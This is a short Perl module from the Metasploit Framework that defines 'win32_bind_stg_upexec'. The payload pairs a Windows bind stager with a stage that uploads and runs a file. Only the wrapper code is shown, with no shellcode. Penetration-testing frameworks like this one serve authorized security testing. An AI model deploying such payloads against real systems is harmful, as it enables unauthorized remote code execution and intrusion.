package Msf::Payload::win32_bind_stg_upexec;
use strict;
use base 'Msf::PayloadComponent::Win32UploadExecStage';
sub load {
  Msf::PayloadComponent::Win32UploadExecStage->import('Msf::PayloadComponent::Win32BindStager');
}
my $info =
{
    'Name'         => 'winbind_stg_upexec',
    'Version'      => '1.0',
    'Description'  => 'Listen for connection then upload and exec file',
    'Authors'      => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}
